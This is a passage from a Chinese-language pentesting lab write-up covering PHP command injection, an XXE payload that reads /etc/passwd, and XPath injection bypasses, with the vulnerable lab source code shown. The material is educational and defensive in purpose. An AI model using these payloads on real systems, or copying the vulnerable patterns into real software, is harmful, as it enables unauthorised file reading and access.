sssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008206.jpg" alt=""></p><p>看下源代码</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (!(preg_match(<span class="hljs-string">'/^\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}$/'</span>, $_GET[<span class="hljs-string">'ip'</span>]))) {</span><br><span class="line">     header(<span class="hljs-string">"Location: example3.php?ip=127.0.0.1"</span>);</span><br><span class="line">  }</span><br><span class="line">  system(<span class="hljs-string">"ping -c 2 "</span>.$_GET[<span class="hljs-string">'ip'</span>]);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>果然直接被跳转了，但是我们用 burp 还是可以直接执行的</p><h3 id="XML-attacks"><a href="#XML-attacks" class="headerlink" title="XML attacks"></a>XML attacks</h3><h4 id="Example-1-8"><a href="#Example-1-8" class="headerlink" title="Example 1"></a>Example 1</h4><p></p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">http</span>://172.16.71.152/xml/example1.php?xml=<span class="hljs-number">%3</span>Ctest<span class="hljs-number">%3</span>Ehacker<span class="hljs-number">%3</span>C/test<span class="hljs-number">%3</span>E</span><br></pre></td></tr></tbody></table></figure><p></p><p>没什么过滤的 xxe ，删掉下载的空格换行什么的就好了，记得 urlencode</p><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "file:///etc/passwd"&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;file;&lt;/root&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Example-2-8"><a href="#Example-2-8" class="headerlink" title="Example 2"></a>Example 2</h4><p></p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">71.152</span><span class="hljs-regexp">/xml/</span>example2.php?name=hacker</span><br></pre></td></tr></tbody></table></figure><p></p><p>看源码得到</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">require_once</span>(<span class="hljs-string">"../header.php"</span>); </span><br><span class="line"></span><br><span class="line">  $x = <span class="hljs-string">"&lt;data&gt;&lt;users&gt;&lt;user&gt;&lt;name&gt;hacker&lt;/name&gt;&lt;message&gt;Hello hacker&lt;/message&gt;&lt;password&gt;pentesterlab&lt;/password&gt;&lt;/user&gt;&lt;user&gt;&lt;name&gt;admin&lt;/name&gt;&lt;message&gt;Hello admin&lt;/message&gt;&lt;password&gt;s3cr3tP4ssw0rd&lt;/password&gt;&lt;/user&gt;&lt;/users&gt;&lt;/data&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $xml=simplexml_load_string($x);</span><br><span class="line">  $xpath = <span class="hljs-string">"users/user/name[.='"</span>.$_GET[<span class="hljs-string">'name'</span>].<span class="hljs-string">"']/parent::*/message"</span>;</span><br><span class="line">  $res = ($xml-&gt;xpath($xpath));</span><br><span class="line">  <span class="hljs-keyword">while</span>(<span class="hljs-keyword">list</span>( ,$node) = each($res)) {</span><br><span class="line">  	<span class="hljs-keyword">echo</span> $node;</span><br><span class="line">  } </span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>看到源码就知道是一个 xpath 注入了，比较类似 sql 注入，用<code>or 1=1</code>的方式绕过即可</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">users/user/name[.='hacker' or '1'='1']/parent::*/message</span><br></pre></td></tr></tbody></table></figure><p></p><p>获取到了</p><p></p><figure class="highlight ebnf hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">Hello hackerHello admin</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>用<code>admin' and '1'='1</code>得到 admin 的认证</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>总结以下还是有点收获的，比如<code>create_function</code>那里的绕过，还有 LDAP 注入以及 XPath 注入， SQL 注入那里也有点收获，比如反引号的利用，也对<code>order by</code>注入有了更好的理解。</p><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script></body></html></div><div class="columns is-variable is-1 is-multiline is-mobile"> <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Sec/">#Sec</a></span> <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/LFI/">#LFI</a></span> <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/sql%E6%B3%A8%E5%85%A5/">#sql注入</a></span> <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/xxe/">#xxe</a></span> <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/xpath/">#xpath</a></span> <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/LDAP%E6%B3%A8%E5%85%A5/">#LDAP注入</a></span> <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/xss/">#xss</a></span> <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/RCE/">#RCE</a></span></div><hr><blockquote class="colorquote info"><p>Article Author: Zeddy</p><p>Article Link: https://blog.zeddyu.info/2019/03/08/Web-For-Pentest/index.html</p><p>Copyright Notice: With the exception of the special statement at the beginning of the article, all articles can be reprinted in accordance with the CC BY 4.0 agreement with the author&#39;s permission.</p></blockquote><blockquote class="colorquote success"><p>Ad: I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: https://blog.zeddyu.info/advertisement/</p><p>Ad: 想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a href="https://blog.zeddyu.info/advertisement/#知识星球" target="_blank" rel="noopener">知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a href="https://blog.zeddyu.info/advertisement/#International-CTF-Team" target="_blank" rel="noopener">International CTF Team</a> 查看详情</p></blockquote><div class="columns is-mobile is-multiline article-nav"> <span class="column is-12-mobile is-half-desktop article-nav-prev"><a href="/2019/03/10/Web-For-Pentest-II/">Web For Pentest II</a></span> <span class="column is-12-mobile is-half-desktop article-nav-next"><a href="/2019/03/06/Sqli%E5%A4%87%E5%BF%98%E5%BD%95/">Sql注入备忘录</a></span></div></article><div class="comments"><h3 class="title is-4">Comments</h3><script>function loadDisqus(){var e=document,n=e.createElement("script");n.src="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqus.js",l=e.createElement("link"),l.href="https://cdn.jsdelivr.net/npm/disqusjs@1.3/dist/disqusjs.css",l.setAttribute("rel","stylesheet"),(e.head||e.body).appendChild(n),e.head.appendChild(l),n.onload=function(){new DisqusJS({shortname:"zeddyu",siteName:"blog.zeddyu.info",identifier:document.location.origin+document.location.pathname+document.location.search,url:document.location.origin+document.location.pathname+document.location.search,title:document.title,api:"https://blog.zeddyu.info/api/",apikey:"57m1j10pU1WfesAhs8Ri3OcmPEaRmoyIuNCPcYaUu6mqWu6Ek4qvRiQf9CXl2JoH",admin:"ZeddYu",adminLabel:""})}}var runningOnBrowser="undefined"!=typeof window,isBot=runningOnBrowser&&!("onscroll"in window)||"undefined"!=typeof navigator&&/(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);setTimeout(function(){isBot||loadDisqus()},1)</script><div id="disqus_thread"></div></div></div></section><footer class="footer"><div class="container"><div class="columns content"><div class="column is-narrow has-text-centered"> &copy; 2021 Zedd&nbsp; Powered by <a href="http://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a> & <a href="http://github.com/ppoffice/hexo-theme-minos">Minos</a></div><div class="column is-hidden-mobile"></div><div class="column is-narrow"><div class="columns is-mobile is-multiline is-centered"> <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/ZeddYu" target="_blank" rel="noopener">GitHub</a> <a class="column is-narrow has-text-black" title="RSS" href="https://blog.zeddyu.info/atom.xml">RSS</a> <a class="column is-narrow has-text-black" title="Twitter" href="https://twitter.com/ZeddYu_Lu" target="_blank" rel="noopener">Twitter</a></div></div></div></div></footer><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.24.0/moment-with-locales.min.js"></script><script>moment.locale("en-AU")</script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.6/clipboard.min.js"></script><style>.hljs{position:relative}.hljs .clipboard-btn{float:right;color:#9a9a9a;background:0 0;border:none;cursor:pointer}.hljs .clipboard-btn:hover{color:#8a8a8a}.hljs>.clipboard-btn{display:none;position:absolute;right:4px;top:4px}.hljs:hover>.clipboard-btn{display:inline}.hljs>figcaption>.clipboard-btn{margin-right:4px}</style><script>$(document).ready(function(){$("figure.hljs").each(function(t,e){var a="code-"+t,r=e.querySelector(".code"),c=$('<button>Copy <i class="far fa-clipboard"></i></button>');r.id=a,c.addClass("clipboard-btn"),c.attr("data-clipboard-target-id",a);var n=e.querySelector("figcaption");n?n.append(c[0]):e.prepend(c[0])}),new ClipboardJS(".clipboard-btn",{target:function(t){return document.getElementById(t.getAttribute("data-clipboard-target-id"))}}).on("success",function(t){t.clearSelection()})})</script><script src="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/js/script.js"></script><script src="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/js/insight.js"></script><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1740444562387978" crossorigin="anonymous"></script><div class="searchbox ins-search"><div class="searchbox-mask"></div><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"> <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..."><span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"></div></div></div></div><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)"},CONTENT_URL:"/content.json"}</script><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script></body></html>